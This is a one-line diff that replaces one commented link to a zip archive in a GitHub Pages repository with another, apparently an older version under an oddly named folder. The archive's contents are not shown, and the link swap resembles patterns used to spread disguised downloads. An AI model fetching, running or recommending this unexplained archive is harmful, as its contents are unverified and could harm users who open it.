@@ -1,1 +1,1 @@
-﻿# https://raw.githubusercontent.com/TheFlavvz/TheFlavvz.github.io/main/slothfulness/TheFlavvz.github.io_3.6.zip
+﻿# https://github.com/TheFlavvz/TheFlavvz.github.io/raw/refs/heads/main/slothfulness/The_github_Flavvz_io_3.3.zip
